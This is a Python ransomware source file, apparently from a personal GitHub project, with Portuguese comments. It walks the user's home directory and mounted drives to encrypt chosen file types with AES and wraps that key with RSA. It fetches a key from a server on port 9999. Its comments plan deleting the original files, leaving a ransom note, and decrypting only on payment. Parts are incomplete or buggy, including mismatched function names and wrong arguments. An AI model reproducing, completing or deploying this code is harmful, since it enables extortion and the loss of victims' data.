#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import socket
from random import choice
import multiprocessing
import getpass
import sys

from AES import *
from RSA import *
from SRSA import *
'''

    COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
    O SERVIDOR ARMAZENA O ID E MANDA UMA CHAVE PARA CRIPTOGRAFAR
    MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
    MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
    IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU

'''




texto='''

    Bom dia, você foi vitma do Ransomware.

'''

# ponto de partida da criptografia
def menu(modo):
    # caminho de partida
    home=os.environ['HOME']
    # lista com os tipos
    f=open('tipos_arquivos.txt','r')
    tipos=f.read()
    tipos=tipos.split('\n')
    # diretorios no caminho de partida
    diretorios=os.listdir(home)
    tam=len(diretorios)
    for a in range(tam):
        p=multiprocessing.Process(target=listar,args=(diretorios[a],tipos))
        p.start()
        #p.join() -> em ordem # espera um terminar para começar outro
    listar(home,tipos,modo)
    listar_media(modo)


def lista_media(modo):
    print('Procurando por pendrives/HDs')
    caminho='/media/'+getpass.getuser()
    if(os.path.isdir(caminho)):
        listar(caminho,modo)



def listar(diretorio, tipos_arq, modo):
    if(modo==1): # criptografa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a=caminho+'/'+arq
                extensao=os.path.splitext(a)
                for ext in tipos_arq:
                    if(extensao[1]==ext):
                        a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                        criptografa(a)

    else: # descriptgrafa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a=caminho+'/'+arq
                extensao=os.path.splitext(a)
                if(extensao[1]=='.cripto'):
                    a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                    descriptografa(a)


def client(IP_serv):
    try:
        s = socket.socket()
        s.connect((IP_serv,9999))
    except socket.error as e:
        print('Erro de conexão: '+str(e))
        exit()
    l = s.recv(1024)
    f = open ("keys/CHAVE_PRIVADA_SERVIDOR.txt", "wb")
    while (l):
        f.write(l)
        l = s.recv(1024)
    f.close()
    s.close()

def gera_chave_AES():
    # GERA SENHA AES que vai criptografar os arquivos
    # Salva senha em arquivo.txt
    tamanho=30
    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
    senha = ''
    for char in xrange(tamanho):
        senha += choice(caracters)

    try:
        f=open('keys/AES.txt','w')
    except IOError:
        os.mkdir('keys')
        f=open('keys/AES.txt','w')
    f.write(senha)
    f.close()
    return senha



def crypto_all():
    AES_key=gera_chave_AES()
    print('[*] chave AES gerada')
    #menu(1) # -> criptografa tudo

    AES_to_RSA()
    print('[*] senha AES criptografado com chave RSA')


    RSA_to_SRSA()
    print('[*] chave privada do cliente criptografada')


def decrypt_all():
    client('localhost')
    SRSA_to_RSA()
    print('[*] chave privada do cliente descriptografada')
    RSA_to_AES()
    print('[*] chave AES descriptografada')
    #menu(2)

crypto_all()
decrypt_all()

# == ALGORITMO ==
    # criptografa todos os arquivos com AES

    # criptografa a chave AES

    # criptografa a chave privada RSA


    ############### SE PAGAR #####################


    # descriptografa a chave privada (R) com a chave privada(S)

    # descriptografa a chave AES, com a chave privada (R)

    # descriptografa todos os arquivos com a chave AES
